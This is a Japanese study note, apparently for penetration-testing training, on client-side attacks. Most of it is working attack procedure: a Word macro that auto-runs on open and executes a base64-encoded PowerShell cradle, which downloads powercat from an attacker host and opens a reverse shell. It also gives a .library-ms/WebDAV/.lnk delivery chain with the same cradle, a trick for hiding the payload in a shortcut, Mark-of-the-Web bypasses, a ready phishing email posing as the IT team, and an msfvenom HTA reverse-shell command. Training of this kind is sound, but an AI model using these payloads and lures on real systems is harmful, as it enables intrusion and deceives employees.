- 関連ノート
	- [Phishing](../Misc/Phishing.md)

---

# 前提 

## 現実世界の攻撃の傾向

内部NWへのイニシャルアクセスへの攻撃ベクターとしては
- １位：Credential attack（認証情報の盗難）
- ２位：<u>Phishing</u>
である。
つまり、人的な脆弱性が侵害の原因の**82%** を占める。

また、外部との境界に設置しているWebサーバ（またはそのアプリ）等の<u>技術的な脆弱性を使用した侵入の割合は非常に低い。</u>

ソース:
[2022-data-breach-investigations-report-dbir.pdf - Verizon（米大手通信会社）](https://www.verizon.com/business/resources/reports/2022/dbir/2022-data-breach-investigations-report-dbir.pdf)

よって、==Client-side Attacksの重要性が高まっている==。

---

## Client-side Attacksとは

- 悪意あるファイルをターゲットに直接配信し、ターゲットの環境でファイルを実行させる攻撃のこと
- 具体的な配信方法としては：
	- Phishing
	- USB Dropping
	- 水飲み場攻撃

- 具体的な悪意あるファイルとしては:
	- Office マクロ
	- Jscriptコード
	- .lnkショートカットファイル

- 攻撃を成功させるためには、ターゲットのOSとインストールされているアプリケーションを特定する必要がある

---
---

# ターゲットの偵察（Recon）

## Information Gathering

目的：
	ターゲットマシンに**一切アクセスせず**に、組織の使用ソフトウェアや環境を推測する。
	　→ 監視回避、痕跡を残さない

方法：
1. [OSINT](../Cheatsheet/Common/OSINT.md#Google%20hacking)を使い、ファイルを列挙する
	- （Gobusterでもファイルを列挙できるが、痕跡が残る）
2. ファイルをExiftoolで解析する

### Exiftool

- [ ] todo: OSINTにまとめる

Exiftoolのコマンド
```zsh
exiftool -a -u [ファイル]
```
- `-a`：重複したタグも表示する
- `-u`：well-knownではないタグも表示する

#### 基本機能

- メタデータの表示：画像ファイルからExif情報を読み取り、カメラのメーカーやモデル、撮影日時、露出設定、焦点距離などの情報を表示
- メタデータの編集：画像ファイルのExif情報を変更したり、新しいメタデータを追加したりできる。例えば、撮影日時の修正や作者名の追加などが可能
- メタデータの削除：不要なExif情報を削除することができる。個人情報や位置情報などのプライバシーに関わるデータを削除する場合に使用されることがある

- 関連ノート：[⚡️File upload vuln](../../BSCP/Server-side/File%20upload%20vuln/⚡️File%20upload%20vuln.md#Exiftoolによるpolyglot作成によるコンテンツ検証の回避実践)

####  出力の着眼点

- Creator：ファイルを最初に作成したユーザー名
- Author：ドキュメントの作成者として設定された名前
- Producer：PDFを生成・変換したソフトウェア
	- 使用しているソフトウェアとバージョンから、既知の脆弱性はないか

---

## Client Fingerprinting（識別）

### Clinet Fingerprintingとは

- 直接到達できない内部NWにいるターゲットの使用OS・ブラウザを明らかにすること
- 目的は侵害前のターゲットの偵察
- 侵害時にターゲットがMacなのに、WindowsのEXEファイルを送っても無意味

### Canarytokens

- Canarytokensとは、ターゲットがブラウザで開くと、ブラウザ、IPアドレス、OSの情報が入手できるリンク（トークン含む）を生成できる
	- （生成したリンクをクリックすると空白のページが表示される）

1. [Create a Canarytoken.](https://canarytokens.org/nest/generate)にアクセスする
2. 任意の種類のトークンを選択する（ここでは例としてWeb bugを選択）
	- 以下キャプチャ以外にも、下にスクロールすると、WordやExcel、PDFなども選択できる
![](../画像ファイル/Pasted%20image%2020250513065718.png)

3. メールアドレス、コメントを入力する。任意で通知先のWebサイトも入力する。Create Canarytokenをクリック。
![](../画像ファイル/Pasted%20image%2020250513065904.png)

4. トークンURLが生成されたことを確認
	- How to use ：概要レベルの使い方が記載
	- Manage Canarytoken：トークンのトリガー有無、Emailアラート通知のon / offが切り替えられる
![](../画像ファイル/Pasted%20image%2020250513070140.png)

5. Manage Canarytokenをクリック後、画面右上のALERTS HISTORYをクリック
![](../画像ファイル/Pasted%20image%2020250513070243.png)

6. Alert Historyには、トークンをクリックしたユーザーのシステム情報が表示される。
↓誰もクリックしていない場合
![](../画像ファイル/Pasted%20image%2020250513070649.png)

↓クリックされた後（自分でクリックした）：CSVやJSONでダウンロード可能
![](../画像ファイル/Pasted%20image%2020250513071026.png)

7. Alerts listに記載のエントリをクリックすると、User-Agent、位置情報など、より詳細な情報を閲覧できる。
	- User-Agentから、ターゲットのOS・ブラウザを推測できる
	- CanarytokenはWebページに埋め込まれたJavaScriptの[Fingerprintingのコード](https://github.com/fingerprintjs/fingerprintjs)でUser-Agentを調査しているので、信頼性は高い（単純にHTTPヘッダから入手しているのではない）
	- [User-Agent parser](https://explore.whatismybrowser.com/useragents/parse/)

#### ！留意事項

- User-Agentの値は、プロキシなどによって書き換えられている場合があるので、Canarytokenの結果を完全には信頼しないこと
- ターゲットがAd-blockerのブラウザを使っているかそうでないかで、結果が異なることがある

---
---

# Microsoft Officeのエクスプロイト（マクロ）

- Unixシステムは、偽サイトをホストして認証情報を入力させる攻撃が現実的
- 学習用の演習環境では、urlリンクを踏ませる + ncでリッスンしているだけで認証情報を入手できることもある(python http serverでは、postパラメタは取得できない)

## Officeを使用したエクスプロイトの前提知識

- 直接メールに悪意のあるファイルを添付することは、昨今のセキュリティ製品によるフィルタやセキュリティ教育によって、成功確率の低い攻撃となっている
- 代わりに、Pretext（口実）を用意し、ダウンロードリンクなどの方法で文書を提供する方法が使われる
- ただし、外部からダウンロードされたOfficeファイルには、MotWが付与される

### MotW（Mark of the Web）

#### MotWとは

- 外部の信頼されていないところからダウンロードされたファイルに対して自動的に付与されるOfficeファイルのプロパティのこと
- Zone.Identifier ADS（代替データストリーム）により付加される
	- ADS：1つのファイルに複数のデータストリーム（見えない“裏ファイル”）を持たせることができる仕組み
	- ZoneId = 3
- MotWが付与されたファイルは...
	- 保護ビュー（Protected view）で開かれ、すべての編集・変更設定が無効になる
	- マクロ、埋め込みオブジェクトの実行がブロックされる

![](../画像ファイル/Pasted%20image%2020250514070955.png)

これまでMotWへの対策として攻撃者は...
- Enable Editing（編集を有効にする）をターゲットに押下させるために、Pretext（口実）として、ドキュメントの一部を"ぼかし"、「すべて閲覧するためには編集を有効にする必要があります」と依頼した
- Enable Contentを押させるように依頼した

![](../画像ファイル/Pasted%20image%2020250514071005.png)

しかしMicrosoftの方針が変わり...
- マクロの実行はデフォルトで無効にするよう設定された（Offic 2013～）：[Microsoft announce 2022/07/20](https://techcommunity.microsoft.com/blog/microsoft_365blog/helping-users-stay-safe-blocking-internet-macros-by-default-in-office/3071805)
- Enable Contentのボタンはなくなり、代わりにLearn Moreと表示されるようになった

![](../画像ファイル/Pasted%20image%2020250514071024.png)

#### MotWありマクロの煩雑な実行ステップ

ターゲットがMotWを解除してマクロを実行するには、以下の煩雑な手順が必要となり、攻撃者は新たなアプローチを考える必要がある

| ステップ              | 説明                                                                                                                               |
| ----------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| ① プロパティ → ブロックの解除 | ファイルを右クリック → プロパティ → セキュリティ：「このファイルは他のコンピュータから取得したものです…」横の許可するにチェックしてOK（→ MotW削除）<br>![ 300](../画像ファイル/Pasted%20image%2020250514071133.png) |
| ② ファイルを開く         | WordやExcelなどでファイルを開くと「保護されたビュー」で開かれる                                                                                             |
| ③ 保護されたビューの解除     | 上部バーにある「編集を有効にする」をクリック                                                                                                           |
| ④ マクロの有効化         | さらに「マクロの有効化」をクリック（マクロ付きファイルのみ表示）  <br>※MotWが残っているとこのステップが出てこない or 永続的にブロックされる                                                    |

#### MotWのバイパス

ファイルにMotWのプロパティを付与させない方法として以下がある：

| 手法                  | 概要                                      | ポイント・備考                           |
| ------------------- | --------------------------------------- | --------------------------------- |
| ISOファイル化            | ISOにファイルを格納し、ユーザーにマウントさせる               | ISO内のファイルはNTFSストリームが無いためMotWが付かない |
| ZIP圧縮 + 解凍ツール依存     | ZIP圧縮し、7-Zipや古い解凍ツールで展開させる              | 7-Zipなど一部ツールはMotWを伝播しない           |
| FAT32/NFSファイルシステム利用 | MotWはNTFSのADSに依存するため、FAT32やNFSでは保存されない  | USBに保存してから実行させるように誘導              |
| IMG/VHD             | 仮想ディスク形式も、マウント後にMotWが除外されるケースがあり、悪用される。 |                                   |

- 参考記事🔗：[Mark-of-the-Web Bypass - Red canary](https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/)

---

## Microsoft WordマクロによるReverse shell獲得

LibreOfficeの場合のマクロ設定方法は、[Proving Grounds Practice write-up - Craft](https://medium.com/@Dpsypher/proving-grounds-practice-craft-4a62baf140cc)を参照

### 用語・前提知識

- [用語](../Misc/用語.md#マクロに関する前提知識)
- [用語](../Misc/用語.md#ActiveXオブジェクト)
- [用語](../Misc/用語.md#Windows%20Script%20Host(WSH))
- [用語](../Misc/用語.md#WScript・CScript)

マクロはClient-Side Attackの攻撃ベクターとして2025年現在も有効
	（[DDE](https://learn.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN)や[OLE](https://en.wikipedia.org/wiki/Object_Linking_and_Embedding)は現在はほぼ使えない）

### Reverse Shell獲得マクロ作成

#### 基礎知識1. マクロ編集に至るまで

1. 空白のWord文書を開き、`.doc`形式でファイルを保存する
	- Word Document：`.docx`
	- Word Macro-Enabled Document：`.docm` → マクロの警告あり
	- ✅Word 97 - 2003 Document：`.doc` → マクロの警告が出ないこともある

![](../画像ファイル/Pasted%20image%2020250515074938.png)

2. マクロ作成ポップアップを開く

![](../画像ファイル/Pasted%20image%2020250515075253.png)

3. Macro name（マクロ名）を入力し、Macros in（マクロの保存先）をステップ１で作成したWordファイル（mymacro.doc）を選択し、Create
	⚠️：保存先を選択しないと、グローバルなテンプレートとして保存されてしまう

![](../画像ファイル/Pasted%20image%2020250515075507.png)

#### 基礎知識2. マクロの基本的な挙動解説：PowerShellを自動で開く

以降は[macro-generator - GitHub](https://github.com/jotyGill/macro-generator)で自動化できる

1. マクロ編集画面を開いた時
```vb
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```
- 上記をsubプロシージャーという
	(subプロシージャーは関数(function)と異なり返り値がない)
- "Sub"、"End Sub"で囲われた部分がVBAのボディ

2. マクロでShellオブジェクトを作成し、PowerShellを実行する
```vb
Sub MyMacro()

	CreateObject("WScript.Shell").Run "powershell"

End Sub
```
- `CreateObject`：[用語](../Misc/用語.md#VBScript)

3. Officeマクロは標準では自動実行されないので、ファイルが開かれたタイミングでマクロが自動的に実行されるようにする
```vb
Sub AutoOpen()

	MyMacro

End Sub

Sub Document_Open()

	MyMacro

End Sub

Sub MyMacro()

	CreateObject("WScript.Shell").Run "powershell"

End Sub
```
- `AutoOpen()`は定義済みマクロ、`Document_Open()`は定義済みイベントで、どちらも同じ目的を持つが、どちらもWord文書の開かれ方によって動作する・しないがあるので、お互いにカバーする

![](../画像ファイル/Pasted%20image%2020250516080832.png)

$$編集後のマクロ$$

4. Save Mymacro（💾）をクリックし、閉じる。Wordも保存し、閉じる
5. マクロ挙動の確認のため、再度開いて、警告とEnable-Content（コンテンツを有効にする）ボタンが表示されることを確認

![](../画像ファイル/Pasted%20image%2020250516081730.png)

6. Enable Contentを押下し、PowerShellが起動されることを確認

![](../画像ファイル/Pasted%20image%2020250516081833.png)

$$PowerShell起動$$

#### 💥3. Reverse Shell獲得マクロの作成手順

- [PowerCat](https://github.com/besimorhino/powercat)実行コマンドをbase64でエンコードし、リテラル文字列として使う
- 🚨注意：VBAではリテラル文字列に*255*キャラクタの制限がある
	- 🔨対策：変数に格納し、変数同士を連結する方法をつかう

1. 攻撃者のマシンでPowerCatファイルをコピーし、コピー先のディレクトリ上でPython webサーバーを用意しておく
```zsh
locate powercat.ps1
cp [/path/to/powercat.ps1] .
sudo python -m http.server 80
```

2. リバースシェルリスナーを用意しておく
```zsh
sudo rlwrap nc -lvnp 4444
```

3. [PowerCat](https://github.com/besimorhino/powercat)を攻撃者マシンからダウンロードさせ、PowerCatを実行してリバースシェルを獲得するコマンドを用意
	 [DownloadCradles.ps1 - Github](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
```powershell
IEX (New-Object Net.Webclient).downloadstring('http://[AttackerIP]/powercat.ps1');powercat -c [AttackerIP] -p [Listener Port] -e powershell
```

3. 特殊文字による実行失敗を防ぐため、Base64エンコードする。
	[忘れがちなコマンド(Linux・Windows)](../Cheatsheet/Common/忘れがちなコマンド(Linux・Windows).md#PowerShellワンライナーのBase64エンコード化)

4. Base64エンコードした文字列を50文字ずつに分割し、`Str = Str + "[分割後のbase64文字列]"`の形式で出力するPythonスクリプトを実行
```python
str = "powershell.exe -nop -w hidden -enc [Base64エンコード後文字列]"

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
- `n = 50`：VBAは255文字の制限ではあるが環境差異を考慮した値。なんでもいいが、100でもうまくいく可能性はある。
- `range(0, len(str), n)`：0から str の長さまで、n（例: 50）文字単位で繰り返す
- `str[i:i+n]`：文字列 str の i から i+n の範囲を切り出す（部分文字列）

![](../画像ファイル/Pasted%20image%2020250517181019.png)

$$Pythonスクリプト実行結果$$

5. マクロ編集画面で文字列型の変数を宣言し、Base64エンコードして分割した文字列を変数で連結していく
```vb
Sub AutoOpen()

    MyMacro
    
End Sub

Sub Document_Open()

    MyMacro
    
End Sub

Sub MyMacro()

    Dim Str As String

	Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
	Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
	Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
	Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
	Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
	Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
    
End Sub
```
- `Dim`：Dimention＝変数の宣言（英語の意味は”範囲”）

6. マクロを保存後、マクロ編集画面を閉じる。ファイルを保存する。ターゲットに開かせる。→リバースシェル獲得！

---
---

# Windows Library Filesの悪用

## 前提知識

### Windows Library Files

- ライブラリ機能として使用されるXML形式のファイル
- ファイルだが、中身はリンク集のような仮想フォルダ
- ダブルクリックで実行可能
- リンクはローカル or リモートどちらでも可で、ローカルディレクトリであるかのように、リモートのコンテンツを表示可能
- 💥外部の共有(WevDav共有)にアクセスさせる目的で使用
- 💥メールセキュリティにより検知されにくいので、これをターゲットに配信する
- ファイル形式：`.library-ms`

### WebDav

- HTTPを使ってWebサーバー上のファイルを読み取り・書き込みできるプロトコル
- リモートにあるファイルを、あたかもローカルで開いているように見せかけられる
- 💥WebDAV共有にペイロードの実行パスをプロパティに持つショートカットを配置する

### ショートカットファイル

- 他のファイル、フォルダ、アプリケーションなどへのポインタとして機能する特殊なファイルのこと
- 💥ダブルクリックで展開もしくは実行可能
- 💥ペイロード実行を目的で使用
- 直接メールで配信すると遮断されやすいので、Windows Library Filesを使用する
- ファイル形式：`.lnk`
- 補足：バックドアとして使われることもある
	- [3. Windows Local Persistence](../TryHackME/Red%20Teaming/3.%20Post%20Compromise/3.%20Windows%20Local%20Persistence.md#ショートカットファイル（lnk）のバックドア化)

---

## 攻撃の概要

### 段階

第一段階：攻撃者のWebDAV共有に接続するWindowsライブラリファイルを作成し、ターゲットに`.library-ms`ファイルを渡して、ターゲットに攻撃者のWebDAVディレクトリを開かせる。

第二段階：PowerShellリバースシェルを実行するための`.lnk`ショートカットファイルの形でWebDAVに格納していたものをターゲットに開かせる

### 手順概要

1. WebDAVサーバーを用意する
    - 攻撃者が用意する。
    - ここに「悪意あるショートカットファイル（.lnk）」を置く。

2. .library-msファイルを作る
    - WebDAV共有先を指す`.library-ms`ファイルを作成。
    - `.library-ms` は普通にダブルクリックできる。

3. ターゲットに`.library-ms`ファイルを渡す
    - メール添付などで送り、保存させる
    - これ自体は怪しいファイル形式に見えにくいので、**スパムフィルタを通り抜けやすい**。

4. ターゲットがダブルクリックする
    - Explorer上では「ローカルのフォルダを開いた」みたいに見える。
    - 実際には攻撃者のWebDAVサーバーにつながってる。

5. WebDAV上の.lnkファイルをダブルクリックさせる
    - ショートカットファイルの中身でリバースシェルが発動。
    - ターゲットのPCから攻撃者へコネクションが張られる。

---

## .library-ms ＋ WebDAV ＋ .lnk によるReverse Shell実行手順

### 🔹 第1段階：WebDAV サーバの準備

0. wsgidavインストール（必要に応じて）
```zsh
sudo apt install python3-wsgidav
```

1. WebDAV サーバ用ディレクトリの作成
```zsh
sudo mkdir ~/Webdav
```

2. （スキップ可）WebDavサーバ用ディレクトリにテスト用として任意のファイルを保存
```zsh
echo test > test.txt
```

3. WebDAVサーバを構築
```zsh
wsgidav --host=0.0.0.0 --port=80 --root=~/Webdav --auth=anonymous
```
- `--host=0.0.0.0`：すべてのインターフェースでWevDavを提供する
- `--root`：WevDavのホームディレクトリを指定する
- `--auth=anonymous`：認証を無効とする

![](../画像ファイル/Pasted%20image%2020250518142233.png)

$$WebDavサーバ構築成功時の出力$$

### 🔹 第2段階：ライブラリファイル(.library-ms)の作成

3. Windowsマシン（VMを開くか、RDPで接続）で、VSCode、なければメモ帳を開く
	- ※Windowsマシン上で構築することで、ライブラリファイルや.ショートカットファイルの構築・テストが非常に楽になる

4. File > New Text File(※)で作成し、デスクトップ上にファイルを保存（ここではファイル名を`config.library-ms`とする）
	- ※：ファイル形式はPlain textでOK

![](../画像ファイル/Pasted%20image%2020250518144800.png)

$$空白Windowsライブラリファイル$$

5. `config.library-ms`ファイルにXMLで記述し、保存
	- ：[Module 12：Client-side Attacks](#補足：XMLコードの解説)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1002</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<AttackerIP></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

6. 攻撃者マシンに`config.library-ms`を転送する（webdavディレクトリではないところに格納）
7. （スキップ可）WebDav共有への接続の成功を確認するため、`config.library-ms`ファイルをダブルクリックで実行する
	- ステップ2でWebdavディレクトリに作成した`test.txt`が表示されていたら成功
	- 💥ファイルパスにはリモートで開かれていることは明示されない
![](../画像ファイル/Pasted%20image%2020250518171045.png)
$$ライブラリファイルをダブルクリックした画面$$

#### 🚨注意：実行後はコードが変わるので要編集

- 一度実行すると、`serialized`というタグが新しく記入される上、`<url>`タグの値に`DavWWWRoot`が付与されてしまう
- このままだと、他のマシンや再起動後の実行で攻撃が失敗する可能性がある
- *対策*としては、ライブラリファイルを実行したら、都度、上記のxmlを再度貼り付けるしかない
	- （しかしターゲットに一度でも実行させればいいので大きな問題ではない）
![](../画像ファイル/Pasted%20image%2020250518171758.png)
$$実行後のライブラリファイルの中身が変わっている$$

#### 補足：XMLコードの解説

1. XMLの名前空間を明示する
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
...
</libraryDescription>
```
- xmlns（xml name space)：XMLにおける名前空間（[📕](../../BSCP/Misc/📕.md#名前空間)）
- `http://schemas.microsoft.com/windows/2009/librarye`：Microsoftのライブラリスキーマに属することを明示する
- [用語](../Misc/用語.md#xmlnsにおけるリンク)

2. 「ドキュメント」のローカライズリソース（文字列・UI要素）などを参照する
```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```
- `<name>`：DLLライブラリの名前を指定
	- 他にも`shell32.dll`が使えるが、"shell"というワードがセキュリティ製品に検知されるかもしれないので使用を避ける
- `-34582`：ドキュメントのリソースID（ピクチャは`-34595`)
	- ※リソースIDは[Resource Hacker](https://forest.watch.impress.co.jp/article/2001/01/29/okiniiri.html)などのツールを使う方法があるが、生成AIに聞く方が楽
- [Module 12：Client-side Attacks](#補足：リソースID(`@windows.storage.dll,-34582`)について)
- `<version>`：任意の数値
- [用語](../Misc/用語.md#DLL(Dynamic%20link%20library))

3. ライブラリファイルの見た目を整備する
```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1002</iconReference>
```
- `<isLibraryPinned>`：Windowsエクスプローラーのナビゲーターパネルに表示されるようにする（以下画像赤枠部分）
- `<iconReference>`：ライブラリファイルのアイコンをリソースのみDLLから選択する
	- `imageres.dll`：リソースが格納されたシステム用DLL
		- パス：C:\Windows\System32\imageres.dll
	- 1002：ドキュメントのアイコンを指すリソースID（1003：ピクチャのアイコン）
 ![](../画像ファイル/Pasted%20image%2020250518151605.png)

4. ライブラリファイルがWindowsエクスプローラー上で開かれたときにどのようなカラム構成（以下画像赤枠）になるかを指定する
```xml
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```
- [Microsoft documentation](https://learn.microsoft.com/ja-jp/windows/win32/shell/schema-library-foldertype)の「フォルダーの種類」に記載されているGUIDを`<folderType>`に指定する（今回はアイコンをドキュメントにしているのでドキュメントのGUIDを指定）
	- 例えばフォルダタイプがミュージックだと、アーティスト名やトラック番号のカラムとなってしまう
![](../画像ファイル/Pasted%20image%2020250518152940.png)

5. ライブラリファイルが指すストレージの場所を指定する
```xml
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://[AttackerIP]</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```
- `<isDefaultSaveLocation>`：ユーザーがファイルを保存したときのwindowsエクスプローラーの挙動・保存場所を指定（true＝デフォルト）
- `<isSupported>`：互換性のために存在するが不要なのでfalse
- `<simpleLocation>`：リモートの場所を指定（WebDav共有）

##### 補足：リソースID(`@windows.storage.dll,-34582`)について

- `@windows.storage.dll,-34582` は、`windows.storage.dll` の中にあるリソースID 34582 を参照する

- Windowsエクスプローラーでライブラリ（たとえば「ドキュメント」や「ピクチャ」など）を表示するとき、見た目の名称が必要になる
- その表示名をハードコードされた文字列ではなく、DLLの中にあるローカライズ済み（多言語対応された）リソースから取得する形式がこの記述

- 何のためにあるのか？　→　 ライブラリの名前（表示名）を指定するためにある
- 34582じゃなくて適当な値でもいいのか？　→　ダメ
- なぜローカライズDLLを使うのか？↓

| 方法                                                      | 影響                                                           |
| ------------------------------------------------------- | ------------------------------------------------------------ |
| `<name>Documents</name>` のように直接書く                       | ・OSの言語が英語以外（日本語など）の場合に対応できない  <br>・翻訳作業が必要になる  <br>・一貫性がなくなる |
| `<name>@windows.storage.dll,-34582</name>` のようにDLLを参照する | ✅ OSが自動で言語に合わせて表示  <br>✅ Windows標準ライブラリと同じ形式で自然に見える          |

### 🔹 第3段階：.lnkファイルの準備

目的：ターゲットが実行できるリバースシェルペイロードを.lnkショートカットファイルに作成すること

7. Windowsデスクトップ上で右クリック > 新規作成 > ショートカットの作成
8. 以下のコマンドを入力し、保存
	（ファイル名はPretextに沿ったものがいい。automatic_configurationなど）
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[AttackerIP]:[Port]/powercat.ps1');powercat -c [AttackerIP] -p [ListenerPort] -e powershell"
```
- 参考：[忘れがちなコマンド(Linux・Windows)](../Cheatsheet/Common/忘れがちなコマンド(Linux・Windows).md#PowerShellワンライナーのBase64エンコード化)
![](../画像ファイル/Pasted%20image%2020250519074203.png)
$$ショートカット作成中の画面$$
#### 💡Tips：ショートカットファイルを無害に見せる方法

- ターゲットがショートカットのプロパティを閲覧し、ショートカットのリンク先を確認してエクスプロイトコードに気付くことがある
- 対策として、エクスプロイトコードのうしろに無害なコマンドを追加して、本来のエクスプロイトコードを見えない位置に追いやることができる
	- Windows 10までは、Targetに256文字まで表示で、内部では4096文字まで保持できた
- ↓イメージ
![ 350](../画像ファイル/Pasted%20image%2020250519075106.png)

### 🔹 第4段階：リバースシェルの受信

9. リバースシェルリスナーを起動しておく
```zsh
sudo rlwrap nc -lvnp <ListnerPort>
```

10. PowerCatをwebdavディレックトリ**以外**にコピーし、Python webサーバを起動しておく
```zsh
locate powercat.ps1
cp </path/to/powercat.ps1> .
sudo python -m http.server <Port>
```
- (※WebDav共有用にポート80は使用済なので80以外を指定)
- (WebDav共有にPowerCatをホストしない理由は、WebDav共有が書き込み可能であり、AVやセキュリティ製品に監視され、ペイロードを削除されるおそれがあるから)

11. テストのため、ショートカットファイルをダブルクリックし、正常にリバースシェルを受信できるか確認する

### 🔹 第5段階：配布と実行

12. Windowsマシン上で作成したショートカット(.lnk)を、攻撃者マシンの`webdav`ディレクトリに配置する
	- [ファイル操作、ユーティリティ](../Cheatsheet/Common/ファイル操作、ユーティリティ.md#scp)

13. （スキップ可）kali上で`test.txt`があれば削除し、ライブラリファイルが変更されていたら再度クリーンにする：[Module 12：Client-side Attacks](#🚨注意：実行後はコードが変わるので要編集)

14. Pretext（口実）を用いて、メールなどで「ライブラリファイル」(.library-ms)を送付（[Phishing](../Misc/Phishing.md#補足：メールの送信方法)）
    メッセージ例：
```
件名：設定ファイルの実行のお願い（ITチームより）

お疲れさまです。ITチームに新しく加わりましたｘｘｘと申します。

先週展開した一部の設定について、今週中を目途として最終的な設定を行っております。  
つきましては、下記の手順で設定の実行をお願いできますでしょうか。

　1. 添付ファイルをダウンロード
　2. ダウンロードフォルダから添付ファイルを開く
　3. 中にある「automatic_configuration」をダブルクリック  

これで設定は完了となります。

ご不明点やエラー等ございましたら、どうぞお気軽にご連絡ください。  
お手数をおかけしますが、よろしくお願いいたします。
```

- あとはターゲットがライブラリファイル(config-library.ms)を展開すると、内部に格納されているショートカット（automatic_configuration.lnk)が確認できるので、実行されたらリバースシェル獲得！

#### 補足：.lnkへMotWが付与されてしまう

- ライブラリファイル上でショートカット(.lnk)を実行すると、MotWが付与され、攻撃が阻害される可能性がある：[Module 12：Client-side Attacks](#MotWとは)
![](../画像ファイル/Pasted%20image%2020250520075229.png)
$$.lnk実行時の警告ポップアップ$$

---
---

# FYI：HTAペイロード作成

- マクロの代わりに使える
- msfvenom：
```zsh
msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0
```

- コードスニペット
```html application
<html>
<head>
<script language="VBScript">

  <!-- just opens cmd terminal -->
  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);

</script>
</head>
<body>
<script language="VBScript">
<!-- close this HTA window now that script running -->
self.close();
</script>
</body>
</html>
```
